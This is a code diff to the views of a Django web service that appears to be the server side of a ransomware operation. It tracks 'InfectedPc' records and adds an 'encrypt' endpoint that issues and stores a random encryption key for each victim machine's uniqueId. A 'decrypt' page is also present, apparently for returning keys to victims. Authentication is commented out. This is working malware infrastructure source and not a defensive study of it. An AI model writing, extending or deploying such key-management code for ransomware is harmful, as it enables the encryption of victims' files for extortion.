@@ -2,15 +2,16 @@ from rest_framework import generics
 from .models import InfectedPc
 from .serializers import InfectedPcSerializer
 from django.http import HttpResponseRedirect, HttpResponse
-
+from base64 import b64encode
+import os
 from rest_framework import generics
 from rest_framework import permissions
 from rest_framework.response import Response
 from rest_framework.views import status
 from django.shortcuts import render
 from .forms import decryptForm
-
-
+import Crypto.Util.number as num
+from rest_framework.decorators import api_view, renderer_classes
 class ListInfectedPcView(generics.ListAPIView):
     """
     Provides a get method handler.
@@ -18,21 +19,34 @@ class ListInfectedPcView(generics.ListAPIView):
     queryset = InfectedPc.objects.all()
     serializer_class = InfectedPcSerializer
     #permission_classes = (permissions.IsAuthenticated,)
-
-    def post(self, request, *args, **kwargs):
-        created = InfectedPc.objects.get_or_create(
-            uniqueId=request.data['uniqueId'],
-            encryptionKey=request.data['encryptionKey'],
-        )
-        if created[1]:
-            return Response(
-                data="InfectedPC entry added",
-                status=status.HTTP_201_CREATED
-            )
+@api_view(('POST','GET'))
+def encrypt(request):
+    if request.method == 'POST':
+        if request.data['uniqueId'] is not None:
+            if not InfectedPc.objects.filter(uniqueId = request.data['uniqueId']).exists():
+                random_key = b64encode(os.urandom(16)).decode('utf-8')
+                InfectedPc.objects.create(
+                    uniqueId=request.data['uniqueId'],
+                    encryptionKey=random_key,
+                )
+                return Response(
+                    data={'encryptionKey': random_key},
+                    status=status.HTTP_201_CREATED
+                )
+            else:
+                return Response(
+                    data="InfectedPC already existing",
+                    status=status.HTTP_200_OK
+                )
         else:
             return Response(
-                data="InfectedPC already existing",
-                status=status.HTTP_200_OK
+                data="No uniqueId provided",
+                status=status.HTTP_405_METHOD_NOT_ALLOWED
+            )        
+    else:
+        return Response(
+                data="Method not supported",
+                status=status.HTTP_405_METHOD_NOT_ALLOWED
             )
 
 def decrypt(request):
@@ -58,6 +72,7 @@ def decrypt(request):
 
     return render(request, 'decrypt.html', {'form': form})
 def index(request):
-    return render(request, 'index.html')
+    number = num.getPrime()
+    return HttpResponse(number)
     
 
